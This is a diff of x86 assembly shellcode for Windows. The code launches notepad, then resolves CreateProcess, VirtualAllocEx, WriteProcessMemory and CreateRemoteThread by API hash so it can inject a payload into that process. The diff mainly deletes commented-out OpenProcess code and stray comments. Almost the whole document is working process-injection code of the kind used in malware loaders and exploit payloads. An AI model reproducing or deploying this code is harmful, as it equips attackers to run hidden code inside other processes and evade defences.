@@ -3,8 +3,7 @@
 global _start
 
 _start:
-
-cld				; Clear Direction Flag; put "cmd" on stack
+	cld				; Clear Direction Flag; put "cmd" on stack
 	push 0xff646170
 	push 0x65746f6e
 	inc byte [esp+0x07]
@@ -51,25 +50,6 @@ cld				; Clear Direction Flag; put "cmd" on stack
 	push 0x16B3FE72	; push createprocessfunction()
 	call api_call		; call createprocess
 	mov ebx,esi		; mov PROCESS INFORMATION Struct address into ebx
-;OpenProcess(
-;  _In_  DWORD dwDesiredAccess,
-;  _In_  BOOL bInheritHandle,
-;  _In_  DWORD dwProcessId
-;)
-;0xC097E2EF		OpenProcess
-;notepad.exe PID 0668
-;xor eax,eax
-;push word 0x6806
-;inc eax
-;push eax
-;dec eax
-;push eax
-;push 0xEFE297C0
-;call api_call
-;mov ebx,eax
-
-
-
 ;VirtualAllocEx(
 ;  _In_      HANDLE hProcess,
 ;  _In_opt_  LPVOID lpAddress,
@@ -95,7 +75,6 @@ mov ecx,esi			; put size in ecx
 call payload
 save:
 pop esi				;save address of payload in memory
-;rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
 ;WriteProcessMemory(
 ;  _In_   HANDLE hProcess,
 ;  _In_   LPVOID lpBaseAddress,
@@ -112,10 +91,6 @@ pop esi				;save address of payload in memory
 	push dword [ebx]	; Process Handle
 	push 0xD83D6AA1		; WriteProcessMemory hash
 	call api_call
-
-
-;call thread			;
-;thread:
 ;CreateRemoteThread(HANDLEhProcess,lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
 ;CreateRemoteThread(notpad.exe PID,*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
 ;0xDD9CBD72		CreateRemoteThread
